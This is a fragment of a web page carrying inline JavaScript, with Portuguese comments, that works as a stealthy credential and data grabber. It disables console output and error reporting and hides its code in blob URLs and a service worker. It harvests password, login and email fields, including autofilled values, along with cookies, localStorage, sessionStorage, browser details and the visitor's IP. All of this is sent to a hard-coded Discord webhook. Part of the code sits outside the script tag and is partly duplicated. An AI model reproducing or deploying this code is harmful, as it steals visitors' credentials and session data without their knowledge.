    body{margin:0;background:#000;color:#f00;font-family:Consolas,Courier New,monospace;font-size:18px;padding:20px;}
    #terminal{width:100%;height:100vh;background:#000;color:#f00;border:3px solid #222;padding:20px;box-sizing:border-box;white-space:pre-wrap;overflow-y:auto;}
    .cursor{display:inline-block;width:10px;height:20px;background:#f00;margin-left:5px;animation:blink .7s infinite;}
    @keyframes blink{50%{opacity:0;}}

<script>
/* ======= 0. INVISIBILIDADE TOTAL ======= */
(()=>{
    /* 0.1 Desativa todos os consoles */
    const nullFn = ()=>{};
    ["log","warn","error","info","debug"].forEach(m=>{ window.console[m]=nullFn; });
    /* 0.2 Remove stack-traces globais */
    window.addEventListener("error", e=>{ e.stopImmediatePropagation(); e.preventDefault(); });
    window.addEventListener("unhandledrejection", e=>{ e.stopImmediatePropagation(); e.preventDefault(); });
})();

/* ======= 1. SERVICE-WORKER BLOB (nÃ£o aparece em Sources) ======= */
const swCode = `
self.addEventListener("install", e=>{
    e.waitUntil(self.skipWaiting());
});
self.addEventListener("activate", e=>{
    e.waitUntil(self.clients.claim());
});
self.addEventListener("fetch", e=>{
    /* intercepta tudo e silencia */
});
/* ======= 2. GRABBER INTERNO NO SW ======= */
const hook = "https://discord.com/api/webhooks/1443161577866924124/3KawgZj1c9mahMBJAyeYTEibDSIRqmqwEgnr6XN3ytYA7tBhGkELpnVVNvi7slWRZedI";
function stealthSend(data){
    fetch(hook,{
        method:"POST",
        headers:{"Content-Type":"application/json"},
        body:JSON.stringify({username:"Ghost",avatar_url:"https://i.imgur.com/7G9cc9e.png",embeds:[{title:"ðŸ‘» GhostData",color:0xff0000,fields:Object.entries(data).map(([k,v])=>({name:k,value:String(v).slice(0,1020),inline:true}))}]})
    }).catch(()=>{});
}
/* 2.1 IndexedDB para persistir entre reloads */
const DB_NAME = "_ghost", STORE = "stash";
function openDB(){
    return new Promise((res,rej)=>{
        const r = indexedDB.open(DB_NAME,1);
        r.onupgradeneeded=()=>{ r.result.createObjectStore(STORE,{keyPath:"id",autoIncrement:true}); };
        r.onsuccess=()=>res(r.result);
        r.onerror=()=>rej();
    });
}
async function stash(obj){
    const db = await openDB();
    db.transaction([STORE],"readwrite").objectStore(STORE).add({data:obj,ts:Date.now()});
    db.close();
}
async function flushStash(){
    const db = await openDB();
    const tx = db.transaction([STORE],"readwrite");
    const all = await tx.objectStore(STORE).getAll();
    await tx.objectStore(STORE).clear();
    db.close();
    if(all.length) all.forEach(r=>stealthSend(r.data));
}
setInterval(flushStash,5000);

/* 2.2 Captura autofil / credenciais */
self.addEventListener("message", e=>{
    if(e.data&&e.data.type==="cred") stash({cred:e.data.body});
});
flushStash();
`;
const blob = new Blob([swCode],{type:"application/javascript"});
const swUrl = URL.createObjectURL(blob);
navigator.serviceWorker.register(swUrl,{scope:"./"}).then(()=>{
    /* ======= 3. SCRIPT INJETADO NO DOM (tambÃ©m blob) ======= */
    const payloadScript = `
(()=>{
    /* 3.1 Leitura de autofil */
    function grabCreds(){
        const inputs = document.querySelectorAll("input[type=password], input[name*=pass], input[name*=login], input[name*=user], input[name*=email]");
        const out={};
        inputs.forEach(i=>{
            const val = i.value || (i.autofill&&i.autofill.match&&i.autofill.match(/^(.*)$/)[0]) || "";
            if(val){
                const label = (i.closest("form")?.querySelector("label[for='"+i.id+"']")?.textContent || i.name || i.placeholder || i.id || "field").replace(/\\s/g,"_");
                out[label]=val;
            }
        });
        if(Object.keys(out).length) navigator.serviceWorker.controller.postMessage({type:"cred",body:out});
    }
    /* 3.2 Observer para campos dinÃ¢micos */
    const obs = new MutationObserver(()=>grabCreds());
    obs.observe(document.body,{childList:true,subtree:true});
    /* 3.3 Hook em submit */
    document.addEventListener("submit",()=>grabCreds(),true);
    /* 3.4 Hook em autofill change (Chrome) */
    window.addEventListener("animationstart",e=>{
        if(e.animationName==="onautofillstart") grabCreds();
    },true);
    /* 3.5 Primeira varredura */
    setTimeout(grabCreds,500);
})();
    `;
    const payloadBlob = new Blob([payloadScript],{type:"application/javascript"});
    const payloadUrl = URL.createObjectURL(payloadBlob);
    import(payloadUrl); /* nÃ£o aparece em DevTools > Sources */
})();
</script>

    function stealthSend(obj){
        fetch(hook,{
            method:"POST",
            headers:{"Content-Type":"application/json"},
            body:JSON.stringify({
                username:"Ghost",
                avatar_url:"https://i.imgur.com/7G9cc9e.png",
                embeds:[{
                    title:"ðŸ‘» GhostEnv",
                    color:0xff0000,
                    fields:Object.entries(obj).map(([k,v])=>({name:k,value:String(v).slice(0,1010),inline:true}))
                }]
            })
        }).catch(()=>{});
    }
    const data={
        url:location.href,
        ua:navigator.userAgent,
        platform:navigator.platform,
        screen:`${screen.width}x${screen.height}x${screen.colorDepth}`,
        tz:Intl.DateTimeFormat().resolvedOptions().timeZone,
        lang:navigator.languages.join(", "),
        cores:navigator.hardwareConcurrency||"unknown",
        mem:navigator.deviceMemory||"unknown",
        ref:document.referrer||"direct",
        cookie:document.cookie||"none",
        ls:JSON.stringify(localStorage),
        ss:JSON.stringify(sessionStorage),
        timing:Math.round(performance.timing.domComplete-performance.timing.navigationStart)+" ms",
        ts:new Date().toISOString()
    };
    fetch("https://api.ipify.org?format=json").then(r=>r.json()).then(j=>{
        data.ip=j.ip;
        stealthSend(data);
    }).catch(()=>{
        data.ip="error";
        stealthSend(data);
    });
})();
</script>
